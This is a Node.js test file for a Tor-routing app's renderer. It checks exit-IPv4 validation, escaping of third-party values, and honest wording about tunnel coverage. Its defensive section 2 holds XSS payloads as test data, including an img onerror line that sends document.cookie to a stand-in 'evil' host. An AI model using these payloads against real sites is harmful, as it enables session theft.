'use strict';
// ════════════════════════════════════════════════════════════════════
//  .build/test-exit-ip.js  --  what the user is told about their IPv4.
//
//  THE REPORT. "ipleak e ipv4 dekhacchena" -- ipleak.net's IPv4 row was blank,
//  and the question was whether that is good or bad.
//
//  MEASURED, before any code was changed (.build/probe-ipleak-latency.js and
//  .build/probe-geosource-latency.js, both direct, no tunnel, nothing running):
//
//      ipv4.ipleak.net    first byte at 8.5 / 12.9 / 15.4 / 16.1 / 17.6 / 21.9 s
//                         and one run that never answered inside 25 s
//      its own budget     5000 ms per try, 3 tries  (ipleak index.js line 72)
//      DNS / TCP          0-6 ms / ~157 ms in every single run
//      api.ipify.org      ~0.3 s      get.geojs.io  0.01-0.3 s
//      ipinfo.io          ~0.3 s      api.country.is  ~0.24 s
//
//  So the blank row is ipleak's own timeout expiring against ipleak's own slow
//  host, on this connection, with or without this app in the path. It is not a
//  hidden address and nothing here can fill it.
//
//  WHAT WAS DECIDED. IPv4 is shown, IPv6 stays hidden. IPv4 cannot be hidden --
//  it is the address the server sends its answer back to -- so a blank row buys
//  no privacy and costs the user the one check that tells them the tunnel is
//  really in another country. main.js has been measuring that address all along
//  (probeExitLocation, four sources, through Tor) and returning it as `exitIp`
//  with nothing on the renderer side reading it.
//
//  WHAT THIS CHECKS. The three renderer functions are lifted OUT of renderer.js
//  and run, so this reads shipped behaviour and not a description of it:
//
//    1. only a real dotted quad is ever put in front of the user
//    2. a hostile `exitIp` from a third-party JSON body cannot reach innerHTML
//    3. every branch that has an address shows it, and none invents one
//    4. no branch sends the user to ipleak.net to check an IPv4 any more
//
//  Nothing is started, nothing is written, no network call is made.
// ════════════════════════════════════════════════════════════════════
const fs   = require('fs');
const path = require('path');
const vm   = require('vm');
const { literalAt } = require('./geo-from-main.js');
const { stripComments } = require('./srcstrip.js');

const ROOT = path.join(__dirname, '..');
//  FP_RENDERER points this suite at a different renderer.js, so the section-5
//  checks can be run against the code that produced the screenshot and shown to
//  fail. Production reads the working tree.
const src  = fs.readFileSync(process.env.FP_RENDERER ||
                             path.join(ROOT, 'renderer.js'), 'utf8');

let pass = 0, fail = 0;
const ok = (cond, name, extra) => {
    if (cond) { pass++; console.log('  ok   ' + name); }
    else { fail++; console.log('  FAIL ' + name + (extra ? '  -- ' + extra : '')); }
};

// ── lift the real functions, do not re-describe them ────────────────
function lift(name) {
    const at = src.indexOf('function ' + name + '(');
    if (at < 0) throw new Error('renderer.js no longer declares ' + name);
    const body = literalAt(src, at);          // balanced, so nested objects are safe
    return src.slice(at, src.indexOf('{', at)) + body;
}

//  scopeNote is the function section 5 is about, and the renderer that produced
//  the screenshot does not have it. Stubbed rather than fatal so that running
//  this suite against that renderer (FP_RENDERER) reports the over-claim by name
//  instead of dying on line one -- a missing scopeNote IS the defect, and a stack
//  trace is a worse way to say so than eleven named failures.
function liftOrStub(name) {
    if (src.indexOf('function ' + name + '(') >= 0) return lift(name);
    return `function ${name}() { return ''; }`;
}

const toasts = [];
const ctx = vm.createContext({
    //  renderer.js builds this at module scope; the lifted ccName needs it.
    regionNames: new Intl.DisplayNames(['en'], { type: 'region' }),
    showToast: (html, kind, ms) => toasts.push({ html, kind, ms }),
    console,
});
vm.runInContext(['ccName', 'ipv4Only', 'resolveExit', 'announceExit'].map(lift)
    .concat(liftOrStub('scopeNote')).join('\n'),
    ctx, { filename: 'renderer-lifted.js' });

const call = (fn, ...a) => vm.runInContext(
    `(${fn})(...__args)`, Object.assign(ctx, { __args: a }));
const say = (resp, verb) => {
    toasts.length = 0;
    call('announceExit', call('resolveExit', resp, 'us'), verb);
    return toasts[0] || { html: '', kind: '', ms: 0 };
};

console.log('── 1. only a literal IPv4 is ever shown ──');
for (const good of ['1.2.3.4', '255.255.255.255', '103.29.124.63', '8.8.8.8'])
    ok(call('ipv4Only', good) === good, `kept: ${good}`);
for (const bad of ['1.2.3', '1.2.3.4.5', '256.1.1.1', '1.2.3.999', '', ' 1.2.3.4',
                   '1.2.3.4 ', 'localhost', '2a00:1450:4001:80f::200e', '::1',
                   'null', 'undefined'])
    ok(call('ipv4Only', bad) === null, `dropped: ${JSON.stringify(bad)}`);
for (const bad of [null, undefined, 0, 1234, {}, [], ['1.2.3.4']])
    ok(call('ipv4Only', bad) === null, `dropped non-string: ${JSON.stringify(bad)}`);

console.log('\n── 2. a hostile value from a third party cannot reach innerHTML ──');
//  `exitIp` is parsed out of a JSON body served by ipleak.net / geojs.io /
//  country.is / ipinfo.io and lands in showToast's innerHTML. If one of them
//  were compromised, or answered through a hostile exit, this is the path.
const HOSTILE = [
    '1.2.3.4"><img src=x onerror=alert(1)>',
    '<script>alert(1)</script>',
    '1.2.3.4</strong><iframe src=javascript:alert(1)>',
    '<img src=x onerror="fetch(\'http://evil/\'+document.cookie)">',
];
for (const evil of HOSTILE) {
    const t = say({ status: 'connected', serverCode: 'jp', requested: 'jp',
                    verified: true, exitIp: evil }, 'connected');
    ok(!/<img|<script|<iframe|onerror|javascript:/i.test(t.html),
       'no markup survives: ' + evil.slice(0, 34), t.html.slice(0, 90));
    ok(!t.html.includes('Exit IPv4'), 'and no address line is drawn for it');
}

console.log('\n── 3. every branch with an address shows it, none invents one ──');
//  fullTunnel is set here because these checks are about the ADDRESS, and the
//  sentence about machine-wide coverage is only true when the tunnel is up.
//  Section 5 is where that sentence is the subject.
const JP = { status: 'connected', serverCode: 'jp', requested: 'jp', verified: true,
             fullTunnel: true };
let t = say({ ...JP, exitIp: '103.29.124.63' }, 'connected');
ok(t.html.includes('Exit IPv4 <strong>103.29.124.63</strong>'), 'verified connect prints the exit IPv4');
ok(t.kind === 'success', 'and stays a success, not a warning');
ok(/Your real IP/.test(t.html), 'and says "your REAL IP" is hidden, next to a shown one');

t = say({ ...JP, exitIp: null }, 'connected');
ok(!/Exit IPv4|null|undefined/.test(t.html), 'no address measured -> no address line, and no "null"');

t = say({ status: 'connected', serverCode: 'ch', requested: 'lu',
         verified: true, exitIp: '5.6.7.8' }, 'connected');
ok(t.html.includes('Exit IPv4 <strong>5.6.7.8</strong>') && /Switzerland/.test(t.html),
   'a connect that landed elsewhere shows the address of where it LANDED');

t = say({ ...JP, dnsViaTor: false, exitIp: '5.6.7.8' }, 'switched');
ok(t.html.includes('Exit IPv4 <strong>5.6.7.8</strong>') && /port 53/.test(t.html),
   'the DNS-leak branch keeps both the address and its warning');

t = say({ status: 'connected', serverCode: 'jp', requested: 'jp',
         verified: false, exitIp: '5.6.7.8' }, 'connected');
//  This branch is reached only by verdict.reason === 'no-answer' (main.js:3237),
//  where NOTHING answered through Tor and verdict.lastSeen is therefore null --
//  so exitIp is null in every state main.js can actually produce here. Fed one
//  anyway: the branch must not grow an address line, because the sentence next
//  to it says the exit could not be checked.
ok(!/Exit IPv4/.test(t.html),
   'the unverified branch draws no address, even if handed one');

console.log('\n── 4. the user is no longer sent to ipleak to read an IPv4 ──');
for (const resp of [{ ...JP, exitIp: '1.2.3.4' }, { ...JP, verified: false },
                    { status: 'connected', serverCode: 'ch', requested: 'lu', verified: true },
                    { ...JP, dnsViaTor: false }]) {
    const h = say(resp, 'connected').html;
    ok(!/ipleak/i.test(h), 'no branch names ipleak: ' + h.slice(0, 46).replace(/<[^>]*>/g, ''));
}
ok(/ipinfo\.io/.test(say({ ...JP, verified: false }, 'connected').html),
   'the unverified branch names a host that answered in ~0.3 s instead');
ok(!/ipleak/i.test(src.slice(src.indexOf('function announceExit'),
                             src.indexOf('function announceExit') + 3000)) ||
   /probe-geosource-latency|probe-ipleak-latency/.test(src),
   'and any remaining mention of ipleak cites the measurement');

console.log('\n── 5. the toast never claims more coverage than the connect got ──');
//  THE REPORT, from the app's own window, both lines visible at once:
//      "Connected! Routed via Netherlands. Exit IPv4 95.155.151.200. Your real
//       IP, DNS & GPS are hidden."
//      "Full-device tunnel did not start -- Reason: the Wintun adapter never
//       appeared"
//  The first sentence was a fixed string. It did not read fullTunnel, it did not
//  read tunnelOff, and it promised GPS on a toast that fires before any browser
//  has confirmed what its extension is holding.
const NL = { status: 'connected', serverCode: 'nl', requested: 'nl', verified: true,
             exitIp: '95.155.151.200' };

t = say({ ...NL, fullTunnel: false }, 'connected');
ok(/did\s+NOT\s+start/.test(t.html),
   'THE REPORTED OVER-CLAIM: a connect whose tunnel failed says so in the same toast that ' +
   'reports the connection', t.html.slice(0, 120));
ok(!/Every program on this PC/.test(t.html),
   'and does not say every program on the PC is covered, because they are not');
ok(/still use your real connection/.test(t.html),
   'it names what is still exposed -- programs that ignore the system proxy');
ok(t.html.includes('Exit IPv4 <strong>95.155.151.200</strong>'),
   'while still reporting the exit address, which IS true');

t = say({ ...NL, tunnelOff: true }, 'connected');
ok(/off in settings/.test(t.html) && !/did NOT start/.test(t.html),
   'a tunnel the user switched off is described as off, not as failed -- the two are not the ' +
   'same thing and only one of them is a fault', t.html.slice(0, 120));

t = say({ ...NL, fullTunnel: true }, 'connected');
ok(/Every program on this PC is going through Tor/.test(t.html) &&
   /Your real IP and DNS are not on the wire/.test(t.html),
   'and the full claim is made only when the tunnel actually came up');
ok(!/anything outside the tunnel is blocked/.test(t.html),
   'without the containment clause, which was not reported on this connect');

t = say({ ...NL, fullTunnel: true, contained: true }, 'connected');
ok(/anything outside the tunnel is blocked/.test(t.html),
   'containment is claimed only when main.js reported it too');

//  GPS. The spoof is the extension's, inside a browser, and this toast fires the
//  moment the tunnel is up -- before any browser has answered. main.js counts
//  the confirmed ones separately.
for (const state of [{ fullTunnel: true, contained: true }, { fullTunnel: false },
                     { tunnelOff: true }]) {
    const h = say({ ...NL, ...state }, 'connected').html;
    ok(!/GPS/i.test(h),
       'no state claims GPS in this toast: ' + JSON.stringify(state));
}

//  Every warning branch too. A toast that warns about one thing and stays silent
//  about the machine's scope is the same over-claim by omission.
const GAPPY = [
    ['moved',      { status: 'connected', serverCode: 'ch', requested: 'lu', verified: true }],
    ['unverified', { status: 'connected', serverCode: 'nl', requested: 'nl', verified: false }],
    ['dnsLeaky',   { status: 'connected', serverCode: 'nl', requested: 'nl', verified: true,
                     dnsViaTor: false }],
];
for (const [name, resp] of GAPPY) {
    const h = say({ ...resp, fullTunnel: false }, 'connected').html;
    ok(/did NOT start/.test(h),
       `the ${name} branch carries the tunnel gap as well`, h.slice(0, 100));
    const up = say({ ...resp, fullTunnel: true }, 'connected').html;
    ok(!/did NOT start|off in settings/.test(up),
       `and drops it when there is no gap: ${name}`);
}

//  The exact sentence that was on screen, gone from the CODE. Comments come out
//  first -- renderer.js quotes the old promise in a comment explaining why it is
//  gone, and a check that cannot tell prose from a string literal would either
//  fail on that comment or force it to be deleted.
const code = stripComments(src);
ok(!/real IP, DNS & GPS are hidden/.test(code) && !/real IP, DNS &amp; GPS/.test(code),
   'and the fixed sentence from the screenshot is not in renderer.js any more, in any branch');
ok(/real IP, DNS & GPS are hidden/.test(src),
   'while the comment saying what it used to promise is still there, so the next reader knows ' +
   'this shape was deliberate');

console.log(`\n${pass}/${pass + fail} checks passed`);
process.exit(fail ? 1 : 0);
